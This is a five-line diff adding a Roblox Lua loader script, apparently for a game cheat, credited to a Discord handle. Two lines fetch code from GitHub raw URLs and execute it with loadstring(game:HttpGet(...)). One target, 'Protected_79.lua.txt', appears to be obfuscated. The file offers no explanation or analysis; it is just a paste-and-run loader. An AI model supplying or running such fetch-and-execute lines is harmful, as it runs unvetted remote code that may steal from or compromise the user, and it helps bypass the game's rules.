@@ -1,0 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Ukazix/impossible-mode/main/Protected_79.lua.txt'))()
+--https://raw.githubusercontent.com/linkpoonapith/script/main/sprint
+loadstring(game:HttpGet('https://raw.githubusercontent.com/linkpoonapith/script/main/sprint'))()
+print("script by Oof#0135")
+--and don't Dm him
